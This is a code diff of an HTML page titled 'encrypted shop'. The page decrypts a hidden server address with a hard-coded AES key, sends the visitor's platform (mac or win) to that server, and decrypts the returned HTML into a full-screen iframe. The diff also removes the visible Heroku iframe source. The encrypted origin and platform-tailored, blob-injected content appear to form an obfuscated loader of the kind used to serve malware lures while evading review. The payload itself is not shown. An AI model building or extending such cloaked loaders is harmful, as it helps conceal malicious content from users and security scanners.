@@ -9,7 +9,7 @@
   </style>
 </head>
 <body>
- <iframe id="frame" src="https://wisdomvector-c888cd8645c7.herokuapp.com/server-api.html"
+ <iframe id="frame"
         style="display:block;width:100%;height:100vh;border:0;"
         title="encrypted shop"
         allowfullscreen
@@ -17,58 +17,107 @@
 </iframe>
 
   <script>
+(() => {
 
-    const PASSPHRASE = "98yNCjeAfWMwk0wI";
+  const PASSPHRASE = "98yNCjeAfWMwk0wI";
 
-const URL_KEY = "UrLk3yShopEase01";
-const ENC_DATA_ORIGIN = "U2FsdGVkX1+eeP3rYck3awlh7p+cRXntKEBc5PvRG/WJ+Xsr5AzdM+Jr8jkEOCHS";
+  const URL_KEY = "UrLk3yShopEase01";
+  const ENC_DATA_ORIGIN = "U2FsdGVkX1+eeP3rYck3awlh7p+cRXntKEBc5PvRG/WJ+Xsr5AzdM+Jr8jkEOCHS";
 
-const DATA_ORIGIN = CryptoJS.AES.decrypt(
-    ENC_DATA_ORIGIN,
-    URL_KEY
-).toString(CryptoJS.enc.Utf8);
+  let lastBlobUrl = null;
 
-const DATA_URL = DATA_ORIGIN + "/data";
+  // decrypt origin safely
+  function getDataOrigin() {
+    try {
+      const decoded = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY)
+        .toString(CryptoJS.enc.Utf8);
 
-let lastUrl = null;
+      if (!decoded) throw new Error("Origin decrypt failed");
 
-function detectPlatform() {
+      return decoded;
+    } catch (err) {
+      console.error("DATA_ORIGIN error:", err);
+      return null;
+    }
+  }
+
+  const DATA_ORIGIN = getDataOrigin();
+  const DATA_URL = DATA_ORIGIN ? `${DATA_ORIGIN}/data` : null;
+
+  function detectPlatform() {
     const p =
-        (navigator.userAgentData && navigator.userAgentData.platform) ||
-        navigator.platform ||
-        navigator.userAgent ||
-        "";
+      (navigator.userAgentData && navigator.userAgentData.platform) ||
+      navigator.platform ||
+      navigator.userAgent ||
+      "";
 
     return /mac/i.test(p) ? "mac" : "win";
-}
+  }
 
-async function loadSecret() {
+  async function loadSecret() {
     const frame = document.getElementById("frame");
 
-    try {
-        const res = await fetch(DATA_URL + "?platform=" + detectPlatform());
-        const { cipher } = await res.json();
-
-        const html = CryptoJS.AES.decrypt(
-            cipher,
-            PASSPHRASE
-        ).toString(CryptoJS.enc.Utf8);
-
-        if (!html) throw new Error("Decrypt failed");
-
-        if (lastUrl) URL.revokeObjectURL(lastUrl);
-
-        const blob = new Blob([html], { type: "text/html" });
-        lastUrl = URL.createObjectURL(blob);
-
-        frame.src = lastUrl;
-
-    } catch (e) {
-        console.error(e);
+    if (!frame) {
+      console.error("Iframe not found");
+      return;
     }
-}
 
-loadSecret();
-  </script>
+    if (!DATA_URL) {
+      console.error("DATA_URL missing");
+      return;
+    }
+
+    try {
+      const res = await fetch(`${DATA_URL}?platform=${detectPlatform()}`);
+
+      if (!res.ok) {
+        throw new Error("Network error: " + res.status);
+      }
+
+      const data = await res.json();
+
+      if (!data || !data.cipher) {
+        throw new Error("Invalid response (cipher missing)");
+      }
+
+      const html = CryptoJS.AES.decrypt(data.cipher, PASSPHRASE)
+        .toString(CryptoJS.enc.Utf8);
+
+      if (!html) {
+        throw new Error("HTML decrypt failed");
+      }
+
+      // cleanup old blob
+      if (lastBlobUrl) {
+        URL.revokeObjectURL(lastBlobUrl);
+      }
+
+      const blob = new Blob([html], { type: "text/html" });
+      lastBlobUrl = URL.createObjectURL(blob);
+
+      frame.src = lastBlobUrl;
+
+      console.log("Loaded securely into iframe");
+
+    } catch (err) {
+      console.error("loadSecret error:", err);
+
+      // fallback UI (optional)
+      frame.srcdoc = `
+        <html>
+          <body style="font-family:sans-serif;text-align:center;padding:40px;">
+            <h2>Loading failed</h2>
+            <p>Please try again later</p>
+          </body>
+        </html>
+      `;
+    }
+  }
+
+  // run
+  loadSecret();
+
+})();
+</script>
 </body>
 </html>
